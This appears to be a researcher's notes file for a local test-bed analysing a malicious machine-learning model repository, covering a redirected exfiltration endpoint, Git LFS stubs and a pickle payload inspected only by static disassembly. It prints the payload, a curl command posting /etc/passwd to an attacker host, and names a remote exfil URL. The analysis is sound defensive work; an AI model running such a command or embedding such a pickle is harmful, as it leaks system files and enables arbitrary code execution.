# Changes made to this repo for local testing

| File | Change | Why |
|---|---|---|
| `train.py` | exfil target changed from `https://attacker-c2.example.com/collect` to `http://127.0.0.1:8080/collect` | test locally without calling out to the internet |

## Known limitations (not something we changed)

- `train.py`'s `train_model()` calls `load_dataset()`, which is never defined anywhere
  in the file - running `python train.py` directly crashes with `NameError` before
  reaching the exfil code. `test-bed/.../trigger_exfil.py` imports and calls
  `exfiltrate_data()` directly instead, bypassing that.
- `pytorch_model.bin` is still a **Git LFS pointer stub** on disk, not the real binary
  content - `git-lfs` was never installed when this repo was cloned. Not needed for
  either PoC vector, so left as-is.

## 2026-09-09

`malicious_optimizer_state.pkl` was also a Git LFS pointer stub (128 bytes of pointer
text, not the 101-byte real pickle) - `pickletools.dis()` against it failed with
`ValueError: at position 0, opcode b'v' unknown` (`'v'` being the first byte of
`version https://git-lfs.github.com/spec/v1`, not a real pickle opcode). Fetched the
actual 101-byte object straight from the HF resolve endpoint (no `git-lfs` binary
needed, that endpoint serves LFS content over plain HTTPS regardless) and replaced the
stub with it. Disassembly now shows the real payload:

```
posix.system('curl -X POST https://attacker.example.com/exfil -d @/etc/passwd')
```
(via a `STACK_GLOBAL` + `TUPLE1` + `REDUCE`, not actually invoked - see the safety
decision below, still just `pickletools.dis()`, never `pickle.load()`.)

## Safety decision on the pickle vector

Unlike `rce-trust-remote-code` (network exfil only), `malicious_optimizer_state.pkl`
is a full arbitrary-code-execution primitive via pickle deserialization - it can do
anything the loading process's user can do (read/write files, spawn processes, run
`sudo` since this account has passwordless sudo). Env-var scrubbing does not protect
against this class of attack.

**Decision: do not actually `pickle.load()` this file.** `test-bed/.../trigger_pickle.py`
only runs `pickletools.dis()` (static disassembly, shows what it would call without
ever executing it) and stops there.
